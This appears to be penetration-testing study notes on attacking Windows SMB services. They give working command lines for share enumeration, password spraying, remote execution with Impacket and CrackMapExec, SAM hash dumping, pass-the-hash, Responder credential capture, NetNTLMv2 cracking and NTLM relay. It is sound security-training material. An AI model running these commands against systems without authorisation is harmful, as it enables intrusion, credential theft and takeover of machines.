# Attacking SMB

## 1. SMB Basics

**SMB (Server Message Block)** provides network file/printer sharing and other Windows network functionality.

### Important ports

| Port      | Purpose                                |
| --------- | -------------------------------------- |
| `445/TCP` | SMB directly over TCP — modern Windows |
| `139/TCP` | SMB over NetBIOS                       |
| `137/UDP` | NetBIOS Name Service                   |
| `138/UDP` | NetBIOS Datagram Service               |

**Samba** = Linux/Unix implementation of SMB.

SMB is also closely associated with **MSRPC**, which can use SMB named pipes for communication.

---

# 2. Enumeration

### Nmap

```bash
sudo nmap -sC -sV -p139,445 <TARGET>
```

Look for:

* SMB/Samba version
* Hostname
* OS clues
* SMB signing
* SMBv1
* NetBIOS information
* Available shares

### Useful SMB scripts

```bash
nmap --script smb-* -p139,445 <TARGET>
```

### Important finding

```text
Message signing enabled but not required
```

→ SMB signing is **not enforced**, which can become relevant for certain relay attacks.

---

# 3. Anonymous / Null Session

A **null session** means SMB/RPC access without valid credentials.

### List shares

```bash
smbclient -N -L //<TARGET>
```

* `-N` → no password
* `-L` → list shares

### SMBMap

```bash
smbmap -H <TARGET>
```

Shows:

* Shares
* Permissions
* Read/write access

---

# 4. Enumerate Shares

### Browse recursively

```bash
smbmap -H <TARGET> -r <SHARE>
```

Look for:

* Credentials
* Backups
* Configuration files
* Scripts
* Sensitive documents
* Password files
* SSH keys
* Database files

### Connect to a share

```bash
smbclient //<TARGET>/<SHARE> -N
```

With credentials:

```bash
smbclient //<TARGET>/<SHARE> -U '<USER>%<PASSWORD>'
```

Inside `smbclient`:

```text
ls
cd <DIR>
get <FILE>
put <FILE>
pwd
help
exit
```

---

# 5. Download / Upload with SMBMap

### Download

```bash
smbmap -H <TARGET> --download "share\file.txt"
```

### Upload

```bash
smbmap -H <TARGET> --upload test.txt "share\test.txt"
```

**READ** → retrieve information.

**WRITE** → potentially upload/modify files.

---

# 6. RPC Enumeration

### rpcclient null session

```bash
rpcclient -U'%' <TARGET>
```

Useful commands:

```text
enumdomusers
enumdomgroups
querydominfo
queryuser <RID>
querygroup <RID>
netshareenum
getdompwinfo
```

Example:

```text
rpcclient $> enumdomusers
```

→ Enumerates domain users.

---

# 7. enum4linux-ng

Automates common SMB/NetBIOS/RPC enumeration.

```bash
enum4linux-ng <TARGET> -A
```

Useful for discovering:

* Domain/workgroup
* Hostname
* Users
* Groups
* Shares
* OS information
* Password policy
* NetBIOS information

---

# 8. Credential Attacks

If null sessions aren't available, valid credentials may be required.

### Password spraying with CME

```bash
crackmapexec smb <TARGET> -u users.txt -p 'Password123!' --local-auth
```

* `-u` → username/list
* `-p` → password
* `--local-auth` → local accounts instead of domain authentication

Continue after successful credentials:

```bash
crackmapexec smb <TARGET> -u users.txt -p 'Password123!' \
--continue-on-success
```

### Important distinction

**Brute force:**

```text
One account → many passwords
```

**Password spraying:**

```text
Many accounts → one/few passwords
```

Spraying generally reduces the risk of triggering account lockouts, but lockout policies and detection controls vary by environment.

---

# 9. Windows SMB Attack Surface

With valid/high-privileged credentials, SMB can provide access to:

* Remote command execution
* Administrative shares
* Logged-on users
* SAM hashes
* Pass-the-Hash
* Other Windows administration functionality

Key shares:

```text
ADMIN$
C$
IPC$
```

---

# 10. Remote Command Execution

## Impacket PsExec

```bash
impacket-psexec '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>'
```

Example:

```bash
impacket-psexec 'WORKGROUP/Administrator:Password123!@10.10.10.10'
```

If successful, you may receive a SYSTEM shell:

```text
C:\Windows\system32> whoami
nt authority\system
```

### Concept

PsExec-style execution generally involves:

```text
Credentials
    ↓
Writable administrative share
    ↓
Upload service executable
    ↓
Create/start Windows service
    ↓
Command execution
```

---

# 11. Other Impacket Execution Methods

### SMBExec

```bash
impacket-smbexec '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>'
```

### ATExec

```bash
impacket-atexec '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>' 'whoami'
```

Think:

```text
psexec  → Service
smbexec → Service/SMB-based execution
atexec  → Task Scheduler
```

---

# 12. CrackMapExec Command Execution

CMD:

```bash
crackmapexec smb <TARGET> \
-u <USER> -p '<PASSWORD>' \
-x 'whoami'
```

PowerShell:

```bash
crackmapexec smb <TARGET> \
-u <USER> -p '<PASSWORD>' \
-X 'whoami'
```

Specify execution method if required:

```bash
--exec-method smbexec
```

---

# 13. Enumerate Logged-on Users

Useful when the same administrator credentials may work across multiple machines.

```bash
crackmapexec smb <SUBNET>/24 \
-u administrator -p '<PASSWORD>' \
--loggedon-users
```

Example:

```bash
crackmapexec smb 10.10.110.0/24 \
-u administrator -p 'Password123!' \
--loggedon-users
```

---

# 14. Dump SAM Hashes

Requires sufficient administrative privileges.

```bash
crackmapexec smb <TARGET> \
-u administrator -p '<PASSWORD>' \
--sam
```

Output contains NTLM hashes:

```text
username:RID:LMHASH:NTHASH:::
```

Possible next steps:

```text
SAM hash
   ↓
Crack password
   OR
Pass-the-Hash
   ↓
Authenticate as user
```

---

# 15. Pass-the-Hash (PtH)

If you have an NTLM hash but cannot crack it, the hash can potentially be used directly for authentication.

### CrackMapExec

```bash
crackmapexec smb <TARGET> \
-u Administrator \
-H <NTLM_HASH>
```

### Impacket

Many Impacket tools support:

```bash
-hashes LMHASH:NTHASH
```

Example:

```bash
impacket-psexec \
-hashes ':<NTLM_HASH>' \
Administrator@<TARGET>
```

**Core concept:**

```text
Password
   ↓
NTLM hash
   ↓
Use hash directly
   ↓
SMB authentication
```

The plaintext password is not required for PtH.

---

# 16. Forced Authentication / NetNTLM

A Windows system may authenticate to an attacker-controlled SMB service.

Common components:

```text
LLMNR
NBT-NS
MDNS
      ↓
Name-resolution spoofing
      ↓
Victim connects to attacker
      ↓
NetNTLMv2 challenge/response captured
```

### Responder

```bash
sudo responder -I <INTERFACE>
```

Example:

```bash
sudo responder -I tun0
```

Captured hashes are normally stored under:

```text
/usr/share/responder/logs/
```

---

# 17. Crack NetNTLMv2

Hashcat mode:

```text
5600 = NetNTLMv2
```

```bash
hashcat -m 5600 hash.txt \
/usr/share/wordlists/rockyou.txt
```

Concept:

```text
NetNTLMv2 capture
      ↓
Hashcat
      ↓
Plaintext password
```

If cracking fails, depending on the environment, **NTLM relay** may be another possible attack path.

---

# 18. NTLM Relay

Instead of cracking the captured NetNTLM authentication:

```text
Victim
  ↓
Authenticates to attacker
  ↓
Captured authentication
  ↓
Relay to another SMB target
  ↓
Authenticate as victim
```

Common tool:

```bash
impacket-ntlmrelayx
```

Example relay setup:

```bash
impacket-ntlmrelayx \
--no-http-server \
-smb2support \
-t <TARGET>
```

Responder's SMB server may need to be disabled when using another SMB listener:

```text
/etc/responder/Responder.conf

SMB = Off
```

**Important condition:** NTLM relay depends heavily on the target's authentication/signing/configuration. SMB signing being **enabled but not required** is an important finding.

---

# 19. RPC

RPC can provide more than enumeration depending on permissions/configuration.

Potential operations include:

* User enumeration
* Group enumeration
* Password changes
* Domain information
* Share enumeration
* Other administrative operations

Start with:

```bash
rpcclient -U'%' <TARGET>
```

Then use:

```text
enumdomusers
enumdomgroups
querydominfo
getdompwinfo
netshareenum
```

---

# 20. SMB Vulnerabilities

Always identify:

```bash
nmap -sV -p139,445 <TARGET>
```

Then determine:

```text
SMB implementation
        ↓
Version / OS
        ↓
Configuration
        ↓
Known CVEs
        ↓
Verify vulnerable conditions
        ↓
Exploit
```

---

# 21. SMBGhost — CVE-2020-0796

**SMBGhost** affected certain Windows 10 versions using SMBv3.1.1 compression.

Conceptually:

```text
Unauthenticated SMB connection
          ↓
Malformed compressed SMB data
          ↓
Integer overflow
          ↓
Memory corruption
          ↓
Remote Code Execution
```

The important lesson isn't memorizing the exploit code.

Remember the vulnerability chain:

```text
Malformed input
      ↓
Missing bounds validation
      ↓
Integer overflow
      ↓
Memory corruption
      ↓
Control over execution
      ↓
RCE
```

Always verify the **exact OS/build, SMB version, patch level, and vulnerability conditions** before attempting exploitation.

---

# 22. SMB Attack Workflow

```text
1. Scan 139/445
       ↓
2. Identify SMB/Samba + OS
       ↓
3. Check SMB signing / SMBv1
       ↓
4. Enumerate shares
       ↓
5. Test null/anonymous access
       ↓
6. Enumerate users/groups/RPC
       ↓
7. Check share permissions
       ↓
8. Search files for credentials/sensitive data
       ↓
9. Test known credentials
       ↓
10. Password spraying if appropriate
       ↓
11. With admin access:
       ├── Remote execution
       ├── Logged-on users
       ├── SAM hashes
       └── Pass-the-Hash
       ↓
12. Investigate forced authentication / NTLM relay
       ↓
13. Check exact SMB version/OS for CVEs
```

---

# Quick Reference

### Enumeration

```bash
sudo nmap -sC -sV -p139,445 <TARGET>
nmap --script smb-* -p139,445 <TARGET>
```

### Null session

```bash
smbclient -N -L //<TARGET>
smbmap -H <TARGET>
rpcclient -U'%' <TARGET>
enum4linux-ng <TARGET> -A
```

### SMB share

```bash
smbclient //<TARGET>/<SHARE> -N
smbclient //<TARGET>/<SHARE> -U '<USER>%<PASSWORD>'
```

### SMBMap

```bash
smbmap -H <TARGET>
smbmap -H <TARGET> -r <SHARE>
smbmap -H <TARGET> --download "share\file"
smbmap -H <TARGET> --upload file "share\file"
```

### Password spraying

```bash
crackmapexec smb <TARGET> -u users.txt -p '<PASSWORD>' --local-auth
```

### Remote execution

```bash
impacket-psexec '<USER>:<PASSWORD>@<TARGET>'
impacket-smbexec '<USER>:<PASSWORD>@<TARGET>'
impacket-atexec '<USER>:<PASSWORD>@<TARGET>' 'whoami'
```

### Logged-on users

```bash
crackmapexec smb <TARGET> -u <USER> -p '<PASSWORD>' --loggedon-users
```

### SAM

```bash
crackmapexec smb <TARGET> -u <USER> -p '<PASSWORD>' --sam
```

### Pass-the-Hash

```bash
crackmapexec smb <TARGET> -u <USER> -H <NTLM_HASH>
impacket-psexec -hashes ':<NTLM_HASH>' <USER>@<TARGET>
```

### Responder

```bash
sudo responder -I <INTERFACE>
```

### NetNTLMv2 cracking

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

### NTLM relay

```bash
impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET>
```

---

## High-value things to memorize

```text
445        → SMB
139        → SMB over NetBIOS

smbclient  → interact with shares
smbmap     → shares + permissions
rpcclient  → RPC enumeration
enum4linux → automated SMB enumeration

psexec     → service-based remote execution
smbexec    → SMB/service-based execution
atexec     → Task Scheduler execution

--sam      → dump SAM hashes
-H         → Pass-the-Hash in CME
Responder  → capture NetNTLM authentication
5600       → Hashcat NetNTLMv2

SMB signing NOT required
           → important finding for relay attacks
```
